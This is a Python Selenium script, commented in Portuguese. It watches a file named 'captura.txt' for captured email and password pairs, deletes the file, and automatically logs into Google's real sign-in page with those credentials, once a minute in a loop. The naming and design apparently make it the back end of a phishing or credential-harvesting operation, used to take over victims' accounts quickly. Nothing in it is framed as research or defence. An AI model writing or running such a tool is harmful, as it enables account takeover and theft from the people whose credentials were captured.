from selenium import webdriver
from webdriver_manager.firefox import GeckoDriverManager
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
import os
import sys

# Garante caminhos absolutos
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ARQUIVO_ALVO = os.path.join(BASE_DIR, "captura.txt")

print(f"[Selenium] Serviço iniciado PID: {os.getpid()} | User ID: {os.getuid()}")

# Configurações do Firefox (instanciadas uma vez, reutilizadas no loop)
options = Options()
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")


# options.add_argument("--headless") # Descomente para ocultar o navegador

def realizar_login(email, senha):
    """
    Função encapsulada para abrir, tentar logar e fechar o navegador.
    Isso garante uma sessão limpa (sem cookies antigos) a cada tentativa.
    """
    driver = None
    try:
        print(f"[Selenium] Iniciando browser para testar: {email}")
        service = Service(GeckoDriverManager().install())
        driver = webdriver.Firefox(service=service, options=options)
        wait = WebDriverWait(driver, 20)

        driver.get("https://accounts.google.com/")

        # --- EMAIL ---
        print("[Selenium] Preenchendo Email...")
        email_input = wait.until(EC.visibility_of_element_located((By.ID, "identifierId")))
        email_input.clear()
        email_input.send_keys(email)

        driver.find_element(By.ID, "identifierNext").click()

        # --- SENHA ---
        print("[Selenium] Aguardando campo de senha...")
        password_input = wait.until(
            EC.visibility_of_element_located((By.NAME, "Passwd"))
        )
        password_input.clear()
        password_input.send_keys(senha)

        password_next = wait.until(
            EC.element_to_be_clickable((By.ID, "passwordNext"))
        )
        driver.execute_script("arguments[0].click();", password_next)

        # Aguarda resultado visual por 5 segundos
        time.sleep(5)
        print('[Selenium] Tentativa concluída.')

    except Exception as e:
        print(f'[Selenium] Erro durante execução: {e}')


# --- LOOP PRINCIPAL ---
while True:
    print("[Selenium] Aguardando novas credenciais...")

    found_email = ""
    found_senha = ""

    # Loop interno: Fica aqui até encontrar um arquivo válido
    while True:
        if os.path.exists(ARQUIVO_ALVO):
            try:
                with open(ARQUIVO_ALVO, "r", encoding="utf-8") as f:
                    content = f.read().strip()

                if content and " " in content:
                    parts = content.split(" ", 1)
                    if len(parts) == 2:
                        temp_email, temp_senha = parts
                        if len(temp_email) > 3:
                            found_email = temp_email
                            found_senha = temp_senha
                            print(f"[Selenium] Credenciais detectadas: {found_email}")
                            try:
                                os.remove(ARQUIVO_ALVO)
                            except:
                                pass
                            break  # Sai do loop de espera para executar o login
            except Exception as e:
                print(f"[Selenium] Erro ao ler arquivo: {e}")
                time.sleep(1)

        time.sleep(1)  # Checa o arquivo a cada 1 segundo

    # Executa a função de login
    realizar_login(found_email, found_senha)

    print("[Selenium] Aguardando 1 minuto antes de processar a próxima captura...")
    time.sleep(60)